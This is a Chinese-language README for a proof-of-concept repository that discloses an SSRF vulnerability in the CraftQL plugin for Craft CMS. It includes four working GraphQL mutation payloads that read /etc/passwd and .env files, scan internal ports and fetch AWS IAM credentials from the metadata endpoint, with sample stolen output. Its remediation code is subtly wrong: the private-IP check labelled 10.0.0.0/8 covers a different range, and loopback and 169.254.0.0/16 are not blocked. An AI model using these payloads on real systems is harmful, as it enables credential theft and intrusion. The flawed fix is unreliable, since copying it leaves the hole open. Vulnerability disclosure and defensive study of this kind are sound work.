# CraftQL SSRF Vulnerability

> 🎯 **影响版本**: Craft CMS 3.x + CraftQL <= 1.3.7
>

## 📌 概述

CraftQL 是 Craft CMS 的一个 GraphQL 插件，在处理 Assets 字段的远程 URL 时存在**服务器端请求伪造 (SSRF)** 漏洞。攻击者可以通过 GraphQL API 利用此漏洞：

- ✅ 读取服务器本地文件（如 `/etc/passwd`, `.env` 配置文件）
- ✅ 扫描内网端口和服务
- ✅ 窃取云服务元数据（AWS/GCP/Azure IAM 凭证）
- ✅ 访问内网敏感服务

## 🎯 漏洞信息

| 项目 | 详情 |
|------|------|
| **漏洞类型** | Server-Side Request Forgery (SSRF) |
| **影响组件** | CraftQL Plugin - GetAssetsFieldSchema.php |
| **漏洞位置** | `vendor/markhuot/craftql/src/Listeners/GetAssetsFieldSchema.php:56 |
| **攻击向量** | 网络 (Network) |
| **利用复杂度** | 低 |
| **所需权限** | 无需认证（仅需 GraphQL Token） |
| **用户影响** | 高 (数据泄露、内网渗透) |

## ⚡ 快速开始

### 环境要求

- Python 3.6+ 或 Bash
- 已安装的 Craft CMS 3.x + CraftQL <= 1.3.7
- 有效的 GraphQL Token

### 运行 POC

#### Python 版本（推荐）

```bash
cd poc
python3 ssrf_poc.py
```

#### Bash 版本

```bash
cd poc
bash ssrf_poc.sh
```

## 📖 漏洞详情

### 根本原因

CraftQL 在处理 Assets 字段的 GraphQL mutation 时，直接使用 `file_get_contents()` 获取用户提供的远程 URL，**未进行任何验证**：

```php
// 文件: vendor/markhuot/craftql/src/Listeners/GetAssetsFieldSchema.php
// 行: 42-70

$remoteUrl = $value['url'];  // ⚠️ 用户输入，无验证
$parts = parse_url($remoteUrl);
$filename = basename($parts['path']);

$uploadPath = \craft\helpers\Assets::tempFilePath();

// 🔴 SSRF 漏洞：file_get_contents() 支持多种协议
file_put_contents($uploadPath, file_get_contents($remoteUrl));
```

### 支持的危险协议

PHP 的 `file_get_contents()` 函数支持多种协议，攻击者可以利用：

| 协议 | 用途 | 示例 |
|------|------|------|
| `file://` | 读取本地文件 | `file:///etc/passwd` |
| `http://` | 内网端口扫描 | `http://192.168.1.1:22/` |
| `https://` | 访问 HTTPS 服务 | `https://internal.service/` |
| `gopher://` | 发送原始 TCP 数据 | `gopher://localhost:6379/` |
| `dict://` | 字典协议攻击 | `dict://localhost:11211/` |
| `ftp://` | FTP 访问 | `ftp://internal.server/` |

## 🎬 攻击演示

### POC #1: 读取 /etc/passwd

```graphql
mutation {
  upsertTestDefault(
    title: "SSRF Test"
    heroImage: {url: "file:///etc/passwd"}
  ) {
    id
  }
}
```

**结果**:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

### POC #2: 读取数据库凭证

```graphql
mutation {
  upsertTestDefault(
    title: "Config Leak"
    heroImage: {url: "file:///var/www/html/.env"}
  ) {
    id
  }
}
```

**结果**:
```
DB_DATABASE=craftcms
DB_USER=craftuser
DB_PASSWORD=SecretPassword123
```

### POC #3: 内网端口扫描

```graphql
mutation {
  upsertTestDefault(
    title: "Port Scan"
    heroImage: {url: "http://192.168.1.1:22/"}
  ) {
    id
  }
}
```

**结果**: 如果端口开放，请求会超时（响应时间 > 5秒）

### POC #4: 云元数据窃取 (AWS)

```graphql
mutation {
  upsertTestDefault(
    title: "Cloud Metadata"
    heroImage: {url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
  ) {
    id
  }
}
```

**结果**: 返回 AWS IAM 凭证

## 🛡️ 修复建议

### 方案 1: URL 协议白名单（推荐）

```php
$parsedUrl = parse_url($remoteUrl);
$allowedSchemes = ['http', 'https'];

if (!isset($parsedUrl['scheme']) || !in_array($parsedUrl['scheme'], $allowedSchemes)) {
    throw new \InvalidArgumentException('Only HTTP/HTTPS URLs are allowed');
}
```

### 方案 2: 域名白名单

```php
$allowedHosts = ['cdn.example.com', 'assets.example.com'];

if (!in_array($parsedUrl['host'], $allowedHosts)) {
    throw new \InvalidArgumentException('Domain not in whitelist');
}
```

### 方案 3: 禁止内网 IP

```php
$host = gethostbyname($parsedUrl['host']);
$ip = ip2long($host);

if ($this->isPrivateIP($ip)) {
    throw new \InvalidArgumentException('Private IP addresses not allowed');
}

private function isPrivateIP($ip) {
    return (
        ($ip >= 3232235521 && $ip <= 3232301055) ||  // 192.168.0.0/16
        ($ip >= 2886729728 && $ip <= 2887778303) ||  // 172.16.0.0/12
        ($ip >= 3221225984 && $ip <= 3221226239)    // 10.0.0.0/8
    );
}
```

### 方案 4: 使用 Guzzle HTTP 客户端

```php
$client = \Craft::$app->getGuzzle();
try {
    $response = $client->get($remoteUrl, [
        'timeout' => 10,
        'connect_timeout' => 5,
        'allow_redirects' => false,
        'stream' => true
    ]);
    $content = $response->getBody()->getContents();
} catch (\Exception $e) {
    throw new \InvalidArgumentException('Failed to fetch URL');
}

file_put_contents($uploadPath, $content);
```

### 临时缓解措施

1. **禁用 CraftQL 插件**（如果不需要 GraphQL 功能）
2. **限制 GraphQL API 访问**（仅允许可信 IP）
3. **撤销所有 GraphQL Token**（重新生成并严格限制权限）
4. **网络隔离**（监控出站流量）

## 📊 影响范围

### 攻击场景

1. **数据泄露**
   - 读取配置文件（数据库凭证、API密钥）
   - 读取源代码
   - 读取日志文件

2. **内网渗透**
   - 端口扫描（识别内网服务）
   - 服务枚举（Redis, MySQL, SSH 等）
   - 利用内网服务漏洞

3. **云服务攻击**
   - AWS: `http://169.254.169.254/latest/meta-data/`
   - GCP: `http://metadata.google.internal/computeMetadata/v1/`
   - Azure: `http://169.254.169.254/metadata/identity`

4. **供应链攻击**
   - 访问内部 API
   - 窃取内部服务凭证
   - 横向移动

## 🔍 检测方法

### 1. 检查漏洞代码

```bash
grep -n "file_get_contents(\$remoteUrl)" \
  vendor/markhuot/craftql/src/Listeners/GetAssetsFieldSchema.php
```

**如果存在此代码，则存在漏洞**

### 2. 检查插件版本

```bash
cat composer.lock | grep -A 5 '"name": "markhuot/craftql"'
```

**版本 <= 1.3.7 受影响**

### 3. 检查 GraphQL 日志

```bash
tail -f storage/logs/*.log | grep "file_get_contents"
```

## 📚 文档

- [详细漏洞分析报告](docs/VULNERABILITY_ANALYSIS.md)
- [POC 使用说明](docs/POC_USAGE.md)
- [修复指南](docs/REMEDIATION_GUIDE.md)
- [道德准则](CODE_OF_CONDUCT.md)

## 🤝 负责任的披露

此漏洞按照负责任的披露原则发布：

1. ✅ 已尝试联系 CraftQL 作者（markhuot）
2. ✅ 给予厂商合理的修复时间
3. ✅ 仅用于教育和防御目的
4. ✅ 未经授权不得用于攻击系统

## ⚖️ 法律声明

此工具和POC仅用于：
- ✅ 授权的安全测试
- ✅ 教育研究
- ✅ 漏洞修复验证
- ✅ 防御性安全评估

**未经授权访问他人系统是非法的。使用此POC前，请确保获得明确授权。**

## 📞 联系方式

- **漏洞发现**: 安全研究人员
- **披露时间**: 2026-02-06
- **项目状态**: 未修复（截至发布日期）

## 🙏 致谢

感谢 Craft CMS 和 CraftQL 社区的贡献。

---

**⚠️ 警告**: 此漏洞利用代码仅用于授权的安全测试和教育目的。使用者需承担法律责任。
